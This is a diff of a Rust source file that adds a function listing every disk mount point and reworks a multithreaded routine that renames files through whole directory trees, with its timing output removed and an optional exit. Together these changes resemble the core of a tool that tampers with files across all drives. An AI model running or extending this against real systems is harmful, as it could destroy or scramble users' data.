@@ -1,14 +1,20 @@
 use std::{fs, io};
 use std::path::PathBuf;
-use std::time::Instant;
+use std::process::exit;
+use std::thread::sleep;
+use std::time::Duration;
+use sysinfo::Disks;
 use threadpool::ThreadPool;
 use walkdir::WalkDir;
 
-pub(crate) fn start_rename(path: PathBuf) {
-    let now = Instant::now();
+pub(crate) fn start_rename(path: PathBuf, do_exit: bool) {
     let cpus = num_cpus::get();
-    println!("{}", cpus);
+    // println!("{}", cpus);
+    // let now = Instant::now();
     rename_tree(path.clone(), 2).unwrap();
+
+    sleep(Duration::from_secs(1));
+
 
     let pool = ThreadPool::new(cpus);
     let paths = fs::read_dir(path.clone()).unwrap();
@@ -17,11 +23,24 @@ pub(crate) fn start_rename(path: PathBuf) {
         pool.execute(move || rename_tree(dir.path(), usize::MAX).unwrap())
     }
     pool.join();
-
-    let now2 = now.elapsed();
-    println!("{:?}", now2);
-    println!("Took {} seconds", now2.as_secs());
+    if do_exit {
+        exit(101);
+    }
+    // let now2 = now.elapsed();
+    // println!("{:?}", now2);
+    // println!("Took {} seconds", now2.as_secs());
 }
+
+pub(crate) fn get_mount_points() -> Vec<PathBuf> {
+    let disks = Disks::new_with_refreshed_list();
+    let mut mount_points: Vec<PathBuf> = Default::default();
+
+    for disk in &disks {
+        mount_points.push(PathBuf::from(disk.mount_point()));
+    }
+    mount_points
+}
+
 
 fn rename_tree(start_directory: PathBuf, max_depth: usize) -> io::Result<()> {
     for entry in WalkDir::new(start_directory)
